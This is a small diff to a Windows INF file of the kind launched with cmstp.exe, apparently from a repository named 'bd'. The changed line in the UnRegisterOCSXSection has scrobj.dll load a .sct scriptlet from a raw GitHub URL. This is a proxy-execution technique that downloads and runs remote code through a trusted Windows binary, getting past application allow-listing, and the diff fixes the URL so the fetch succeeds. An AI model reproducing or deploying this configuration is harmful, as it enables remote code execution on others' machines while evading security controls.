@@ -6,7 +6,7 @@ AdvancedINF=2.1
 UnRegisterOCSx=UnRegisterOCSXSection
 
 [UnRegisterOCSXSection]
-%11%\scrobj.dll,NI,https://github.com/r3cursive123/bd/t1.sct
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/r3cursive123/bd/master/t1.sct
 
 [Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager"
